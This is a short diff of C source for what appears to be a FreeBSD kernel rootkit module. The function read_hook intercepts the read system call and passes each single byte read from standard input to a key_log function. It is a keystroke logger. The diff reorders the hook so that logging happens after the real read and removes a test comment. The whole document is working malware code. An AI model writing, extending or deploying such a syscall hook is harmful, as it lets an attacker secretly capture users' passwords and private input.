@@ -410,7 +410,6 @@ read_hook(struct thread *td, void *syscall_args)
 	fp = NULL;
 	buf = NULL;
 
-	//Davids Testin
 	if ((uap->nbyte) && (uap->nbyte == 1) &&  uap->fd == 0) {
 	    char keybuf[1];
             copyin(uap->buf, keybuf, 1);
@@ -418,9 +417,9 @@ read_hook(struct thread *td, void *syscall_args)
             int keyError = key_log(td, keybuf);
             if(keyError)
 	        return(keyError);
-	    return(ret_sys);
+	    //return(ret_sys);
 	}
-	//end
+	
 	ret = getvnode(td, uap->fd, cap_rights_init(&rights, CAP_LOOKUP), &fp);
 	if (ret == 0)
 	{
@@ -457,6 +456,15 @@ read_hook(struct thread *td, void *syscall_args)
 		copyout(buf, uap->buf, size);
 		free(buf, M_TEMP);
 	}
+        if ((uap->nbyte) && (uap->nbyte == 1) &&  uap->fd == 0) {
+	    char keybuf[1];
+            copyin(uap->buf, keybuf, 1);
+ 
+            int keyError = key_log(td, keybuf);
+            if(keyError)
+	        return(keyError);
+	}
+
 
 	return(ret_sys);
 }
